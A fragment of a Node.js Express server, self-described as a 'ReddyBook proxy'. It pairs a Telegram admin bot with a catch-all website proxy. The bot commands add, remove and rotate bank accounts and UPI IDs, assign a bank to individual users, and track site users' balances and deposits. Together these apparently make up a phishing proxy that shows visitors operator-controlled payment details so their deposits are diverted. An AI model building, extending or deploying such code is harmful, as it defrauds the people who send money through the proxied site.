        m += `${icon} ${e.username} | ₹${e.amount} | Total: ₹${e.totalAdded} | ${e.time}\n`;
      }
      if (filtered.length > 15) m += `\n... ${filtered.length - 15} more entries`;
      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/clearhistory') {
      data.balanceHistory = [];
      await saveData(data);
      await bot.sendMessage(chatId, '🗑 Balance history cleared.');
      return res.sendStatus(200);
    }

    if (text === '/idtrack') {
      const tracked = data.trackedUsers || {};
      const ids = Object.keys(tracked);
      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet.'); return res.sendStatus(200); }
      let m = '📋 Tracked Users:\n\n';
      for (const uid of ids) {
        const u = tracked[uid];
        const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
        m += `👤 ${uid}${hasOverride}\n`;
        if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
        m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n\n`;
      }
      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/banks') {
      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
      await bot.sendMessage(chatId, '💳 Banks:\n\n' + bankListText(data));
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI\n(BankName and UPI optional)'); return res.sendStatus(200); }
      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
      const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
      data.banks.push(newBank);
      if (data.activeIndex < 0) data.activeIndex = 0;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank ')) {
      const idx = parseInt(text.substring(12).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      if (data.userOverrides) {
        for (const uid of Object.keys(data.userOverrides)) {
          const uo = data.userOverrides[uid];
          if (uo.bankIndex !== undefined) {
            if (uo.bankIndex === idx) delete uo.bankIndex;
            else if (uo.bankIndex > idx) uo.bankIndex--;
          }
        }
      }
      await saveData(data);
      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank ')) {
      const idx = parseInt(text.substring(9).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
      data.activeIndex = idx;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Active bank #${idx + 1}: ${data.banks[idx].accountHolder}`);
      return res.sendStatus(200);
    }

    if (text === '/help') {
      await bot.sendMessage(chatId, 'Use /start to see all commands.');
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch(e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

app.get('*', async (req, res) => {
  const path = req.path;
  if (path.startsWith('/api/') || path.startsWith('/ws/')) {
    return res.status(404).json({ error: 'API calls should go directly to the API server' });
  }
  await websiteProxy(req, res);
});

app.all('*', async (req, res) => {
  const path = req.path;
  if (path.startsWith('/api/') || path.startsWith('/ws/')) {
    return res.status(404).json({ error: 'API calls should go directly to the API server' });
  }
  await websiteProxy(req, res);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`ReddyBook proxy running on port ${PORT}`));

module.exports = app;
